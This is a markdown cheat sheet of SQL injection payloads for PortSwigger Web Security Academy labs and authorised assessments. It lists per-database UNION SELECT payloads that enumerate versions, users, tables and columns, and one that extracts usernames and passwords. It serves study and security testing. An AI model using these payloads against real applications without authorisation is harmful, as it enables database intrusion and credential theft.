# SQL Injection Cheat Sheet

## Introduction

This cheat sheet contains commonly used SQL Injection payloads and techniques for manual testing.

It is intended as a quick reference while solving PortSwigger Web Security Academy labs or performing SQL Injection assessments.

---

# Confirm SQL Injection

Test for SQL errors.

```sql
'
```

Ignore the remaining query.

```sql
'--
```

Boolean-based test.

```sql
' OR 1=1--
```

False condition.

```sql
' OR 1=2--
```

---

# SQL Comments

| Database | Comment |
|----------|---------|
| Oracle | `--` |
| PostgreSQL | `--` |
| MySQL | `--`, `#` |
| Microsoft SQL Server | `--` |
| SQLite | `--` |

---

# Determine Number of Columns

Using ORDER BY

```sql
' ORDER BY 1--
```

```sql
' ORDER BY 2--
```

```sql
' ORDER BY 3--
```

Continue increasing the number until an error occurs.

---

# Find Text Columns

Using UNION SELECT

```sql
' UNION SELECT NULL,NULL--
```

Replace NULL with text.

```sql
' UNION SELECT 'TEST',NULL--
```

or

```sql
' UNION SELECT NULL,'TEST'--
```

The column displaying **TEST** is the text column.

---

# Retrieve Database Version

| Database | Payload |
|----------|---------|
| Oracle | `UNION SELECT NULL,banner FROM v$version--` |
| PostgreSQL | `UNION SELECT NULL,version()--` |
| MySQL | `UNION SELECT NULL,@@version--` |
| Microsoft SQL Server | `UNION SELECT NULL,@@version--` |
| SQLite | `UNION SELECT NULL,sqlite_version()--` |

---

# Retrieve Current User

| Database | Payload |
|----------|---------|
| Oracle | `UNION SELECT NULL,user FROM dual--` |
| PostgreSQL | `UNION SELECT NULL,current_user--` |
| MySQL | `UNION SELECT NULL,user()--` |
| Microsoft SQL Server | `UNION SELECT NULL,SYSTEM_USER--` |
| SQLite | Not Applicable |

---

# Retrieve Current Database

| Database | Payload |
|----------|---------|
| Oracle | `SYS_CONTEXT('USERENV','CURRENT_SCHEMA')` |
| PostgreSQL | `current_database()` |
| MySQL | `database()` |
| Microsoft SQL Server | `DB_NAME()` |
| SQLite | Not Applicable |

---

# Enumerate Tables

| Database | Query |
|----------|-------|
| Oracle | `SELECT table_name FROM all_tables` |
| PostgreSQL | `SELECT table_name FROM information_schema.tables` |
| MySQL | `SELECT table_name FROM information_schema.tables WHERE table_schema=database()` |
| Microsoft SQL Server | `SELECT table_name FROM information_schema.tables` |
| SQLite | `SELECT name FROM sqlite_master WHERE type='table'` |

---

# Enumerate Columns

| Database | Query |
|----------|-------|
| Oracle | `SELECT column_name FROM all_tab_columns WHERE table_name='USERS'` |
| PostgreSQL | `SELECT column_name FROM information_schema.columns WHERE table_name='users'` |
| MySQL | `SELECT column_name FROM information_schema.columns WHERE table_name='users' AND table_schema=database()` |
| Microsoft SQL Server | `SELECT column_name FROM information_schema.columns WHERE table_name='users'` |
| SQLite | `SELECT sql FROM sqlite_master WHERE name='users'` |

---

# Extract Data

```sql
UNION SELECT username,password FROM users--
```

---

# String Concatenation

| Database | Operator |
|----------|----------|
| Oracle | `||` |
| PostgreSQL | `||` |
| MySQL | `CONCAT()` |
| Microsoft SQL Server | `+` |
| SQLite | `||` |

---

# Common SQL Injection Techniques

- Error-Based SQL Injection
- UNION-Based SQL Injection
- Boolean-Based Blind SQL Injection
- Time-Based Blind SQL Injection
- Out-of-Band (OAST) SQL Injection
- Second-Order SQL Injection

---

# Useful SQL Injection Keywords

```
SELECT
FROM
WHERE
UNION
ALL
ORDER BY
GROUP BY
LIMIT
OFFSET
NULL
AND
OR
LIKE
IN
EXISTS
CASE
CAST
CONCAT
```

---

# References

- PortSwigger Web Security Academy
- OWASP SQL Injection Prevention Cheat Sheet
- SQLMap Documentation
